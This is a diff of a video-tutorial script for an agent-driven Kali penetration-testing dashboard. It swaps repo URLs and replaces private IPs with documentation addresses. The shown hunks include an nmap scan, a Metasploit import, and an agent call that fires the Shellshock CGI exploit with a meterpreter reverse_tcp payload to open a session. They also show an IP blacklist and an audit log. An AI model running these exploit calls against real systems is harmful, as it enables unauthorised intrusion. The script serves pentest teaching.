@@ -65,7 +65,7 @@ NARRATOR:
 
 [ON-SCREEN COMMANDS - Type these out slowly]
 
-git clone https://github.com/wezzels/agentic-ai.git
+git clone https://github.com/dmrobbi/agentic-ai.git
 cd agentic-ai/kali_dashboard
 
 # Install Python dependencies
@@ -278,7 +278,7 @@ If we accidentally try to scan something else, it will be blocked."
 IP Blacklist:
 8.8.8.8
 1.1.1.1
-192.168.1.1
+192.0.2.1
 
 NARRATOR:
 "The blacklist blocks specific IPs no matter what.
@@ -728,7 +728,7 @@ I always add:
 
 [VISUAL: Try to scan blacklisted IP]
 
-Target: 192.168.1.1 (blacklisted)
+Target: 192.0.2.1 (blacklisted)
 Result: ❌ BLOCKED - Target is blacklisted
 
 NARRATOR:
@@ -779,8 +779,8 @@ NARRATOR:
   "timestamp": "2026-04-18T01:23:45Z",
   "user": "admin",
   "tool": "nmap",
-  "target": "192.168.1.100",
-  "command": "nmap -sV 192.168.1.100",
+  "target": "192.0.2.100",
+  "command": "nmap -sV 192.0.2.100",
   "exit_code": 0,
   "duration": 45.3
 }
@@ -854,7 +854,7 @@ all Metasploit features."
 ```
 [VISUAL: Run Nmap scan]
 
-nmap -sV -oA scan.xml 192.168.1.100
+nmap -sV -oA scan.xml 192.0.2.100
 
 [VISUAL: Import into Metasploit]
 
@@ -863,7 +863,7 @@ agent.msfrpc.import_nmap("scan.xml")
 [VISUAL: View hosts in database]
 
 Hosts:
-- 192.168.1.100
+- 192.0.2.100
   - Port 22: SSH
   - Port 80: Apache 2.4.41
   - Port 443: Apache 2.4.41
@@ -882,7 +882,7 @@ Let's try one..."
 result = agent.execute_metasploit_exploit(
     exploit="exploit/multi/http/apache_mod_cgi_bash_env_exec",
     payload="linux/x86/meterpreter/reverse_tcp",
-    target="192.168.1.100"
+    target="192.0.2.100"
 )
 
 [VISUAL: Session opened]
@@ -999,7 +999,7 @@ In this video, you'll learn how to [brief description].
 5:00 - [Topic 3]
 
 📚 Resources:
-- Documentation: https://github.com/wezzels/agentic-ai
+- Documentation: https://github.com/dmrobbi/agentic-ai
 - Test Target: scanme.nmap.org
 - Discord: https://discord.gg/clawd
 
